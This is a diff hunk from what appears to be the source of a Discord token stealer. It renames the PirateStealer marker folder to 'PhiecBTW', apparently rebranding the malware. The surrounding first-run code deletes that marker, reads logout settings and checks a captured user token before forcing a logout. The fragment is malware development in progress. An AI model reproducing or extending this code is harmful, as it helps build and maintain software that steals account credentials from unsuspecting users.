@@ -74,10 +74,10 @@ function FirstTime() {
                 
             }
         }
-        if (!fs.existsSync(path.join(__dirname, "PirateStealerBTW"))) {
+        if (!fs.existsSync(path.join(__dirname, "PhiecBTW"))) {
             return !0
         }
-        fs.rmdirSync(path.join(__dirname, "PirateStealerBTW"));
+        fs.rmdirSync(path.join(__dirname, "PhiecBTW"));
         if (config.logout != "false" || config.logout == "%LOGOUT%") {
             if (config['logout-notify'] == "true") {
                 if  (token == null || token == undefined || token == "") {
